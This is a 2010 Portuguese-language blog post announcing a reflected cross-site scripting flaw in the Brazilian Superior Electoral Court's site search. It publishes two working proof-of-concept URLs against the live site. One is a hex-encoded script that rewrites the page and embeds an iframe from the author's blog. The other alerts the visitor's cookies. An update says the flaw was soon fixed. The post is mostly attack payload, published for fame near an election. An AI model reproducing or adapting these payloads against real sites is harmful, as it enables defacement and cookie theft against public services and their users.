---
layout: default
title: Rapidinha - TSE XSS
date: 2010-09-12 21:45
author: brennords
comments: true
categories: [Hacking]
---
Navegando por acaso no site do <a href="http://www.tse.gov.br/" target="_blank">Tribunal Superior Eleitora</a>l, encontrei uma falha que permite ataques do tipo XSS (já que estamos perto da eleição, bem que posso ganhar alguma fama por isso né?), resolvi postar por postar, e porque estou escrevendo um texto, sobre como tirar todo potencial desse tipo de falha, fazendo mais do que simplesmente exibir uma msgbox na tela, enfim, ai vai the proof of concept:

<a href="http://www.tse.gov.br/buscasite/cdd.jsp?usearch.p_mode=Advanced%3C%73%63%72%69%70%74%3E%64%6F%63%75%6D%65%6E%74%2E%74%69%74%6C%65%3D%22%54%53%45%20%58%53%53%65%64%22%3B%76%61%72%20%70%61%67%65%3D%22%3C%6D%61%72%71%75%65%65%3E%3C%68%31%3E%3C%63%65%6E%74%65%72%3E%42%72%65%6E%6E%30%3C%2F%68%31%3E%3C%2F%63%65%6E%74%65%72%3E%3C%69%66%72%61%6D%65%20%73%72%63%3D%68%74%74%70%3A%2F%2F%62%72%65%6E%6E%30%2E%77%6F%72%64%70%72%65%73%73%2E%63%6F%6D%3E%3C%2F%6D%61%72%71%75%65%65%3E%22%3B%64%6F%63%75%6D%65%6E%74%2E%62%6F%64%79%2E%69%6E%6E%65%72%48%54%4D%4C%3D%70%61%67%65%3B%61%6C%65%72%74%28%22%58%53%53%22%29%3B%3C%2F%73%63%72%69%70%74%3E" target="_blank">http://www.tse.gov.br/buscasite/cdd.jsp?usearch.p_mode=Advanced"%3C%73%63%72%69%70%74%3E%64%6F%63%75%6D%65%6E%74%2E%74%69%74%6C%65%3D%22%54%53%45%20%58%53%53%65%64%22%3B%76%61%72%20%70%61%67%65%3D%22%3C%6D%61%72%71%75%65%65%3E%3C%68%31%3E%3C%63%65%6E%74%65%72%3E%42%72%65%6E%6E%30%3C%2F%68%31%3E%3C%2F%63%65%6E%74%65%72%3E%3C%69%66%72%61%6D%65%20%73%72%63%3D%68%74%74%70%3A%2F%2F%62%72%65%6E%6E%30%2E%77%6F%72%64%70%72%65%73%73%2E%63%6F%6D%3E%3C%2F%6D%61%72%71%75%65%65%3E%22%3B%64%6F%63%75%6D%65%6E%74%2E%62%6F%64%79%2E%69%6E%6E%65%72%48%54%4D%4C%3D%70%61%67%65%3B%61%6C%65%72%74%28%22%58%53%53%22%29%3B%3C%2F%73%63%72%69%70%74%3E</a>

ou simplesmente:

<a href="http://www.tse.gov.br/buscasite/cdd.jsp?usearch.p_mode=Advanced%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E" target="_blank">http://www.tse.gov.br/buscasite/cdd.jsp?usearch.p_mode=Advanced%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E</a>

<span style="color:#ffffff;">Update 15/09/2010</span>

<span style="color:#ffffff;">A falha foi corrigida mais rápido do que eu imaginava, como minhas provas não funcionam mais, só resta esperar a turma do XSSed.com validar e postar um mirror, <a title="Xssed - Brenn0" href="http://www.xssed.com/search?key=Brenn0" target="_blank">nesse link aqui </a>você encontra os sites vulneráveis a XSS que eu submeti aos arquivos do site, brevemente o do TRE também estará lá.</span>

<strong>=*</strong>
